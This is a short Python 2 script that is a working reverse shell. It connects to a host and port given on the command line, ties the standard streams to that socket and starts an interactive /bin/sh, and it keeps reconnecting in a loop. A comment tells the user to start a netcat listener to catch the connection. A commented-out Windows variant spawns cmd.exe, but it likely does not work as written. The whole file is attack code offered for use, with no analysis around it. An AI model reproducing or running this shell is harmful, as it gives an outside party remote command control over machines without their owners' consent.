#!/usr/bin/python
# start a local netcat listener and have this call back to it
import socket
import sys
import os
import subprocess
if len(sys.argv) < 3:
	print "Usage: %s [ip/host] [port]" % ( sys.argv[0] )
	exit()
target = sys.argv[1]
port = int(sys.argv[2])
while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,port))
	os.dup2(s.fileno(), 0)
	os.dup2(s.fileno(), 1)
	os.dup2(s.fileno(), 2)
	subprocess.call(['/bin/sh', '-i'])
s.close()

'''
# uncomment this section for Windows
while True:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((target,port))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 subprocess.call(['cmd.exe'])
'''
